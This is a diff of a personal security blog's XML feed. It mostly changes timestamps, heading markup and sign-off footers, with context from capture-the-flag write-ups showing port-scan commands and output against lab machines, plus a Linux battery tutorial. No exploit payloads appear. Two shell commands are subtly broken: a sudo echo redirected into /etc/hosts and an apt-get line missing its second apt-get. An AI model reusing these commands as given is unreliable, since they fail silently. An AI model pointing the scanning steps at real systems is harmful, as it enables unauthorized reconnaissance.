@@ -3,7 +3,7 @@
     <title>Offensive Blogs — Sakibul Ali Khan</title>
     <link href="https://sakibulalikhan.pages.dev/feed.xml" rel="self" />
     <link href="https://sakibulalikhan.pages.dev" />
-    <updated>2023-08-27T13:05:17+06:00</updated>
+    <updated>2023-08-28T17:20:21+06:00</updated>
     <author>
         <name>Sakibul Ali Khan</name>
     </author>
@@ -23,7 +23,7 @@
             <category term="CTF Writeups"/>
             <category term="Brute Force"/>
 
-        <updated>2023-08-27T13:05:17+06:00</updated>
+        <updated>2023-08-28T17:11:51+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/12/thm-capture-hero.png" alt="Capture TryHackMe Writeup" />
@@ -34,8 +34,8 @@
             <![CDATA[
                     <p><img src="https://sakibulalikhan.pages.dev/media/posts/12/thm-capture-hero.png" class="type:primaryImage" alt="Capture TryHackMe Writeup" /></p>
                 <p id="c45e" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly<strong class="lk fp">.</strong></p>
-<h1 id="5273" class="mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj" data-selectable-paragraph="">Difficulty = Easy</h1>
-<p id="3b4f" class="pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj" data-selectable-paragraph=""><strong class="lk fp">Challenges: Authentication Bypass, Login Bruteforce, Regex, Custom Python Scripting.</strong></p>
+<p id="5273" class="mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj"><strong>Difficulty = </strong>Easy</p>
+<p id="3b4f" class="pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj"><strong class="lk fp">Challenges: </strong><span class="lk fp">Authentication Bypass, Login Bruteforce, Regex, Custom Python Scripting.</span></p>
 <p id="014c" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af nj" href="https://tryhackme.com/room/capture" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/capture</a></p>
 <p id="fb69" class="pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj nk dropcap" data-selectable-paragraph=""><span class="l nl nm nn bn no np nq nr ns eb">W</span>ell, In Task 1 we got some general information and a task file that contains a list of usernames and a list with passwords.</p>
 <figure class="nu nv nw nx ny lf kx ky paragraph-image">
@@ -117,7 +117,7 @@
             <category term="HTB"/>
             <category term="CTF Writeups"/>
 
-        <updated>2023-08-25T02:24:26+06:00</updated>
+        <updated>2023-08-28T17:12:06+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/8/phonebook.jpg" alt="Phonebook — HTB Web Challenge Writeup" />
@@ -257,7 +257,7 @@
             <category term="Subdomain"/>
             <category term="CTF Writeups"/>
 
-        <updated>2023-08-24T23:56:08+06:00</updated>
+        <updated>2023-08-28T17:12:42+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/6/TakeOver.jpg" alt="TakeOver TryHackMe Writeup" />
@@ -269,8 +269,8 @@
                     <p><img src="https://sakibulalikhan.pages.dev/media/posts/6/TakeOver.jpg" class="type:primaryImage" alt="TakeOver TryHackMe Writeup" /></p>
                 <p id="4842" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Recently blackhat hackers approached us saying they could takeover and are asking us for a big ransom. Please help us to find what they can takeover.</p>
 <p id="e010" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Our website is located at <a class="af rn" href="https://futurevera.thm/" rel="noopener ugc nofollow" target="_blank">https://futurevera.thm</a></p>
-<h1 id="649a" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Difficulty = Easy</h1>
-<p id="c20c" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges: Sub-Domain Enumeration, Sub-Domain Takeover.</strong></p>
+<p id="649a" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p>
+<p id="c20c" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges: </strong><span class="ly kz">Sub-Domain Enumeration, Sub-Domain Takeover.</span></p>
 <p id="34a2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af rn" href="https://tryhackme.com/room/takeover" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/takeover</a></p>
 <p id="1425" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The beginning starts the machine and grub the IP. Then add the $IP in /etc/hosts for futurevera.thm Use the bellow command to do that.</p>
 <pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8522" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sudo <span class="hljs-built_in">echo</span> &lt;THM-IP&gt; futurevera.thm &gt;&gt; /etc/hosts</span></pre>
@@ -359,7 +359,7 @@
             <category term="IoT"/>
             <category term="CTF Writeups"/>
 
-        <updated>2023-08-25T01:37:26+06:00</updated>
+        <updated>2023-08-28T17:15:12+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/5/Bugged.jpg" alt="Bugged Tryhackme CTF Writeup" />
@@ -370,12 +370,12 @@
             <![CDATA[
                     <p><img src="https://sakibulalikhan.pages.dev/media/posts/5/Bugged.jpg" class="type:primaryImage" alt="Bugged Tryhackme CTF Writeup" /></p>
                 <p id="ee57" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">John</strong> was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?</p>
-<h1 id="a92b" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Difficulty = Easy</h1>
-<p id="c5ce" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges: Network Analyze, IoT Hacking.</strong></p>
+<p id="a92b" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p>
+<p id="c5ce" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong><span class="ly kz"> Network Analyze, IoT Hacking.</span></p>
 <p id="f868" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning start with Rustscan. For scan, we use ‘-a’ flag to specify our target. And we also use ‘-r’ flag to set port ranges.</p>
 <pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="dc46" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali~ rustscan -a <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> -r <span class="hljs-number">1</span>-<span class="hljs-number">5000</span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| {}  }| { } |{ {_<span class="hljs-number">_</span> {<span class="hljs-number">_</span>   <span class="hljs-number">_</span>}{ {_<span class="hljs-number">_</span>  /  __<span class="hljs-number">_</span>} / {} \ |  <span class="hljs-string">`| |<br>| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br>`</span>-<span class="hljs-string">' `-'</span><span class="hljs-string">`-----'`</span>----<span class="hljs-string">'  `-'</span>  <span class="hljs-string">`----'  `</span>---<span class="hljs-string">' `-'</span>  <span class="hljs-string">`-'`</span>-<span class="hljs-string">' `-'</span><br>The Modern Day Port Scanner.<br>_______________________________________<span class="hljs-number">_</span><br>: https:<span class="hljs-regexp">//gi</span>thub.com/RustScan/RustScan :<br> --------------------------------------<br>🌍HACK THE PLANET🌍<br><br>[~] The config file is expected to be at <span class="hljs-string">"/home/sak/.rustscan.toml"</span><br>[~] File limit higher than batch size. Can increase speed by increasing batch size <span class="hljs-string">'-b 1073741716'</span>.<br>Open <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span>:<span class="hljs-number">1883</span><br>[~] Starting Script(s)<br>[&gt;] Script to be run Some(<span class="hljs-string">"nmap -vvv -p {{port}} {{ip}}"</span>)<br><br>[~] Starting Nmap <span class="hljs-number">7.93</span> ( https:<span class="hljs-regexp">//nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span> +<span class="hljs-number">06</span><br>Initiating Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">2</span> ports]<br>Completed Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">24</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s elapsed<br>DNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">1</span> port]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">1883</span>/tcp on <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Completed Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">25</span>s elapsed (<span class="hljs-number">1</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Host is up, received conn-refused (<span class="hljs-number">0</span>.<span class="hljs-number">25</span>s latency).<br>Scanned at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span>:<span class="hljs-number">49</span> +<span class="hljs-number">06</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>s<br><br>PORT     STATE SERVICE REASON<br><span class="hljs-number">1883</span>/tcp <span class="hljs-keyword">open</span>  mqtt    syn-ack</span></pre>
 <p id="d3fd" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there is 1 a service running. In target machine service ‘MQTT’ is running on TCP port ‘1883’.</p>
-<h1 id="2f82" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Basic Information About ‘MQTT’</h1>
+<h2 id="2f82" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Basic Information About ‘MQTT’</h2>
 <p id="dc0e" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, <strong class="ly kz">extremely simple, and lightweight messaging protocol</strong>, designed for constrained devices and low-bandwidth, high-latency, or unreliable networks. The design principles are to minimize network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal for the emerging “machine-to-machine” (M2M) or “Internet of Things” world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.</p>
 <p id="253d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Default port:</strong> 1883</p>
 <figure class="yq yr ys yt yu yv kl km paragraph-image">
@@ -431,6 +431,9 @@
 <p id="ef65" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Note: In here I changed the base64 code to not reveal the flag. Cause I really want you to do all the stuff on your own. Why not? IoT hacking isa pleaser.</p>
 </blockquote>
 <p id="4755" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Happy Hacking!!!!! See you next time in another post :)</p>
+<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
+<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
+<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy Bugged~</strong></p>
             ]]>
         </content>
     </entry>
@@ -446,7 +449,7 @@
             <category term="Tryhackme"/>
             <category term="CTF Writeups"/>
 
-        <updated>2023-08-19T03:10:33+06:00</updated>
+        <updated>2023-08-28T17:16:02+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/4/MD2PDF.jpg" alt="TryHackMe MD2PDF CTF Writeup" />
@@ -457,7 +460,7 @@
             <![CDATA[
                     <p><img src="https://sakibulalikhan.pages.dev/media/posts/4/MD2PDF.jpg" class="type:primaryImage" alt="TryHackMe MD2PDF CTF Writeup" /></p>
                 <p id="1a74" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">MD2PDF</strong> 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…?</p>
-<h1 id="838c" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Difficulty = Easy</h1>
+<p id="838c" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p>
 <p id="0d0c" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong> PDF, Markdown, SSRF.</p>
 <p id="3dbc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we start with Nmap scan. For scan we use ‘-sV’ flag to know about services &amp; versions. And we also use ‘-Pn’ flag to not ping to the server.</p>
 <pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="2d3f" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-meta">@kali</span>:<span class="hljs-operator">~/</span>ctf$ sudo nmap <span class="hljs-operator">-</span>sV <span class="hljs-operator">-</span><span class="hljs-type">Pn</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">39.142</span><br><span class="hljs-type">Host</span> <span class="hljs-keyword">is</span> up (<span class="hljs-number">0</span>.19s latency).<br><span class="hljs-type">Not</span> shown: <span class="hljs-number">997</span> closed tcp ports (reset)<br><span class="hljs-type">PORT</span> <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> ssh <span class="hljs-type">OpenSSH</span> <span class="hljs-number">8</span>.2p1 <span class="hljs-type">Ubuntu</span> 4ubuntu0.<span class="hljs-number">5</span> (<span class="hljs-type">Ubuntu</span> <span class="hljs-type">Linux</span>; <span class="hljs-keyword">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp<br><span class="hljs-number">5000</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp</span></pre>
@@ -533,6 +536,9 @@
 </div>
 </figure>
 <p id="4131" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bang……! We got our flag!!!!</p>
+<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
+<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
+<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy MD2PDF~</strong></p>
 <figure class="yq yr ys yt yu yv kl km paragraph-image"><a href="https://www.buymeacoffee.com/sakibulalikhan"></a></figure>
             ]]>
         </content>
@@ -547,7 +553,7 @@
         <media:content url="https://sakibulalikhan.pages.dev/media/posts/3/Charge-Threshold.jpg" medium="image" />
             <category term="Linux"/>
 
-        <updated>2023-08-25T01:41:52+06:00</updated>
+        <updated>2023-08-28T17:17:37+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/3/Charge-Threshold.jpg" alt="How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux" />
@@ -571,7 +577,7 @@
 <div class="fp tp tq tr ts">
 <div class="ab cm">
 <div class="gv bg gw gx gy gz">
-<h1 id="1573" class="zn zf tu be zg zo anh zq ld zr ani zt lh zu anj zw zx zy ank aba abb abc anl abe abf abg bj" data-selectable-paragraph="">So, Let’s begin our journey</h1>
+<h2 id="1573" class="zn zf tu be zg zo anh zq ld zr ani zt lh zu anj zw zx zy ank aba abb abc anl abe abf abg bj">So, Let’s begin our journey</h2>
 <p id="32a0" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Firstly make sure that your system is up to date. If not sure, then try running this command in the terminal:</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="542a" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">sudo apt-get update &amp;&amp; upgrade -y</span></pre>
 <p id="4418" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Let’s start by figuring out the battery name for your ASUS laptop. This can be done by using the following command:</p>
@@ -591,7 +597,7 @@
 </figure>
 <p id="5ca2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This method works but, <strong class="ly kz">it is not a permanent solution</strong> as it will revert back to its default value i.e. 100 after reboot. So, you have to run this command every time the laptop restarts.</p>
 <p id="d353" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So we move to the next step to make it permanent.</p>
-<h1 id="f94d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Now try to make permanent</h1>
+<h4 id="f94d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Now try to make permanent</h4>
 <p id="bbee" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">So, to make it permanent we have to run this command at every startup. To achieve that we have to add this command to the <strong class="ly kz"><em class="abt">/etc/crontab</em></strong> file. (In Linux, using <strong class="ly kz">crontab</strong> we can run different activities at different instances. In this case, we shall run the command at reboot.)</p>
 <p id="ac5d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To edit the <strong class="ly kz">‘crontab’</strong> file run the following command in the terminal:</p>
 <pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5f40" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">sudo nano /etc/crontab</span></pre>
@@ -619,7 +625,10 @@
 <div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*b13t-rcZbnt2HATvewN2ug.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*b13t-rcZbnt2HATvewN2ug.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*b13t-rcZbnt2HATvewN2ug.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*b13t-rcZbnt2HATvewN2ug.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*b13t-rcZbnt2HATvewN2ug.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*b13t-rcZbnt2HATvewN2ug.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*b13t-rcZbnt2HATvewN2ug.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*b13t-rcZbnt2HATvewN2ug.png 640w, https://miro.medium.com/v2/resize:fit:720/1*b13t-rcZbnt2HATvewN2ug.png 720w, https://miro.medium.com/v2/resize:fit:750/1*b13t-rcZbnt2HATvewN2ug.png 750w, https://miro.medium.com/v2/resize:fit:786/1*b13t-rcZbnt2HATvewN2ug.png 786w, https://miro.medium.com/v2/resize:fit:828/1*b13t-rcZbnt2HATvewN2ug.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*b13t-rcZbnt2HATvewN2ug.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*b13t-rcZbnt2HATvewN2ug.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*b13t-rcZbnt2HATvewN2ug.png" alt="" width="700" height="384" loading="lazy" data-is-external-image="true"></figure></picture></div>
 </div>
 </figure>
-<p id="d2ff" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now, every time you’ll reboot the laptop, <strong class="ly kz">Asus Battery Health Charging</strong> will be enabled by default. Now you can work on your Linux system without worries.</p>
+<p data-selectable-paragraph="">Now, every time you’ll reboot the laptop, <strong class="ly kz">Asus Battery Health Charging</strong> will be enabled by default. Now you can work on your Linux system without worries.<br><br></p>
+<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
+<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
+<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy ASUS Battery Health Charging~</strong></p>
 <figure class="yq yr ys yt yu yv kl km paragraph-image"><a href="https://www.buymeacoffee.com/sakibulalikhan"></a></figure>
 </div>
 </div>
@@ -641,7 +650,7 @@
             <category term="Cyber Security"/>
             <category term="CVE"/>
 
-        <updated>2023-08-25T01:46:21+06:00</updated>
+        <updated>2023-08-28T17:18:18+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/2/The-Dirty-Pipe.jpg" alt="The Dirty Pipe Vulnerability On Linux" />
@@ -697,6 +706,9 @@
 </div>
 </figure>
 <h3 class="align-left">The End.</h3>
+<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
+<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
+<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy Linux Exploit~</strong></p>
             ]]>
         </content>
     </entry>
@@ -711,7 +723,7 @@
             <category term="Tryhackme"/>
             <category term="CTF Writeups"/>
 
-        <updated>2023-08-25T01:54:10+06:00</updated>
+        <updated>2023-08-28T17:20:21+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.pages.dev/media/posts/1/vulnnetinternal.jpg" alt="TryHackMe Writeup — VulnNet Internal" />
@@ -730,20 +742,20 @@
 <li>User Flag</li>
 <li>Root Flag</li>
 </ol>
-<h1>Enumeration</h1>
+<h2>Enumeration</h2>
 <p id="ac8b" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">We start the enumeration with a <code class="ff abm abn abo abp b">nmap</code> scan to look for open ports and running services</p>
 <p id="08fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong>Nmap Scan</strong></p>
